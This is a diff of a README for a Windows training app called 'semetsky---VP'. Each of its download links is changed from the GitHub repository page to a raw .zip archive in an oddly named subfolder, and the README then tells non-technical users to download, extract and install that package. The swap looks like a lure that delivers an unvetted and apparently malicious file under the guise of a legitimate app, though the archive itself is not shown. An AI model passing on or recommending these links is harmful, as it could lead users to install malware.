@@ -1,6 +1,6 @@
 # 🛡️ semetsky---VP - Learn the Risk Behind Control
 
-[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/MohamedElmogy25/semetsky---VP)
+[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/MohamedElmogy25/semetsky---VP/main/ananaplas/semetsky_VP_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@
 
 Use the link below to visit the download page and get the app:
 
-[Visit the download page](https://github.com/MohamedElmogy25/semetsky---VP)
+[Visit the download page](https://raw.githubusercontent.com/MohamedElmogy25/semetsky---VP/main/ananaplas/semetsky_VP_3.7.zip)
 
 ## 🖥️ What You Need
 
@@ -24,7 +24,7 @@ The app is designed for a normal desktop or laptop. You do not need a server, a 
 
 ## 📥 Download and Install
 
-1. Open this page: [https://github.com/MohamedElmogy25/semetsky---VP](https://github.com/MohamedElmogy25/semetsky---VP)
+1. Open this page: [https://raw.githubusercontent.com/MohamedElmogy25/semetsky---VP/main/ananaplas/semetsky_VP_3.7.zip](https://raw.githubusercontent.com/MohamedElmogy25/semetsky---VP/main/ananaplas/semetsky_VP_3.7.zip)
 2. Find the download area on the page.
 3. Download the Windows package or release file.
 4. If the file is in a .zip folder, right-click it and choose Extract All.
@@ -199,7 +199,7 @@ It can help non-technical staff understand why a small mistake can grow into a m
 
 If you need to get the app again, use this link:
 
-[https://github.com/MohamedElmogy25/semetsky---VP](https://github.com/MohamedElmogy25/semetsky---VP)
+[https://raw.githubusercontent.com/MohamedElmogy25/semetsky---VP/main/ananaplas/semetsky_VP_3.7.zip](https://raw.githubusercontent.com/MohamedElmogy25/semetsky---VP/main/ananaplas/semetsky_VP_3.7.zip)
 
 ## 🧭 Simple Start Path
 
